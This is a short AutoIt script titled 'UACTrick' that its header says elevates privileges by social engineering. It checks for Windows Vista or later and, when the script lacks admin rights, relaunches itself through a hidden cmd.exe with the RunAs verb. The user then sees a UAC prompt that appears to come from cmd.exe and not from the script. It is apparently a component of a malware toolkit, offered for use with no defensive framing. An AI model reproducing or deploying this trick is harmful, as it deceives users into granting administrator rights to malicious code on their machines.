#cs ----------------------------------------------------------------------------
  
 Script Name: UACTrick
 AutoIt Version: 3.3.8.1
 Author: Scorpio
 Thanks To: Pink
  
 Script Function:
    Tries to elevate privileges by Social Engineering.
 
#ce ----------------------------------------------------------------------------

Func UACTrick()
	Local $Ver = RegRead("HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion", "CurrentVersion")

	If IsAdmin() = False And $Ver >= 6.0 Then
		ShellExecute(@SystemDir & '\cmd.exe', '/c "' & @ScriptFullPath & '"', '', 'RunAs', @SW_HIDE)
	EndIf
EndFunc
